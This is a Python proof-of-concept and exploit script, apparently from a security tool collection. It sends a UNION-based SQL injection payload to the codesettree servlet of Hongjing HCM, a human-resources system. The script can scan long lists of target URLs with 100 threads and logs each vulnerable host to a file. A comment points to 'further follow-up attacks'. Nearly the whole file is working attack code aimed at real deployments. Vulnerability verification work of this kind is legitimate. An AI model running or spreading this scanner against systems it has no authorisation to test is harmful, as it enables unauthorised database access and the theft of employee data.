import sys,re,time,requests,argparse
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings() # 禁用urllib3警告
GREEN = '\033[92m'  # 输出颜色
RESET = '\033[0m'

# 打印程序欢迎界面
def banner():
    test = """
 
██╗  ██╗ ██████╗ ███╗   ██╗ ██████╗      ██╗██╗███╗   ██╗ ██████╗     ██╗  ██╗ ██████╗███╗   ███╗
██║  ██║██╔═══██╗████╗  ██║██╔════╝      ██║██║████╗  ██║██╔════╝     ██║  ██║██╔════╝████╗ ████║
███████║██║   ██║██╔██╗ ██║██║  ███╗     ██║██║██╔██╗ ██║██║  ███╗    ███████║██║     ██╔████╔██║
██╔══██║██║   ██║██║╚██╗██║██║   ██║██   ██║██║██║╚██╗██║██║   ██║    ██╔══██║██║     ██║╚██╔╝██║
██║  ██║╚██████╔╝██║ ╚████║╚██████╔╝╚█████╔╝██║██║ ╚████║╚██████╔╝    ██║  ██║╚██████╗██║ ╚═╝ ██║
╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝  ╚════╝ ╚═╝╚═╝  ╚═══╝ ╚═════╝     ╚═╝  ╚═╝ ╚═════╝╚═╝     ╚═╝                                                                                            
                                                                           version:1.1.0
                                                                           author:Hardog                                                                    
"""
    print(test)

# 主函数
def main():
    banner()
    parser = argparse.ArgumentParser(description="宏景HCM poc&exp")
    parser.add_argument('-u','--url',type=str,help='Please input link')
    parser.add_argument('-f','--file',type=str,help='File Path')

    args = parser.parse_args()

    # 如果提供了url而没有提供文件路径
    if args.url and not args.file:
        poc(args.url)
    # 如果提供了文件路径而没有提供url
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip().replace('\n',''))
        mp = Pool(100) # 创建一个线程池，最大线程数为100
        mp.map(poc,url_list) # 映射poc函数到url列表，并行执行
        mp.close() # 关闭线程池
        mp.join() # 等待所有线程执行完毕
    else:
        print(f"\n\tUage:python3 {sys.argv[0]} -h")

# 漏洞检测函数
def poc(target):
    # SQL注入测试payload
    payload_url = "/servlet/codesettree?categories=~31~27~20union~20all~20select~20~27hongjing~27~2c~40~40version~2d~2d&codesetid=1&flag=c&parentid=-1&status=1"
    url = target + payload_url

    # 请求头
    header = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close',
        'Upgrade-Insecure-Requests': '1'
    }

    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }

    try:
        # 发送POST请求
        res1 = requests.post(url=url, headers=header, proxies=proxies, verify=False)
        # 检查响应状态码和内容是否包含指定字符串
        if res1.status_code == 200 and "Copyright" in res1.text:
            print(f'[+] 该网站存在SQL注入，url为{target}')
            # 将结果写入到result.txt文件中
            with open('result.txt', 'a') as f:
                f.write(target+'\n')
        else:
            print(f'[-] 该网站不存在SQL注入，url为{target}')
        
    except Exception as e:
        # 捕获异常并打印错误信息
        print(f"[*] 该网站无法访问，url为{target}")
        return False

def exp(target):
    # SQL注入测试payload
    payload_url = "/servlet/codesettree?categories=~31~27~20union~20all~20select~20~27hongjing~27~2c~40~40version~2d~2d&codesetid=1&flag=c&parentid=-1&status=1"
    url = target + payload_url

    header = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close',
        'Upgrade-Insecure-Requests': '1'
    }

    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }

    try:
        # 发送POST请求
        res1 = requests.post(url=url, headers=header, proxies=proxies, verify=False)
        # 检查响应状态码和内容是否包含指定字符串
        if res1.status_code == 200 and "Copyright" in res1.text:
            print(f'[+] {GREEN}该网站存在SQL注入，url为 {target}\n{RESET}')
            # 将结果写入到result.txt文件中
            with open('result.txt', 'a') as f:
                f.write(target+'\n')
        else:
            print(f'[-] 该网站不存在SQL注入')
                # 这里可以执行进一步的操作，比如写入日志或者进行其他后续攻击
    except Exception as e:
        # 捕获异常并打印错误信息
        print(f"[*] 该网站无法访问")
        return False
    
if __name__ == '__main__':
    main()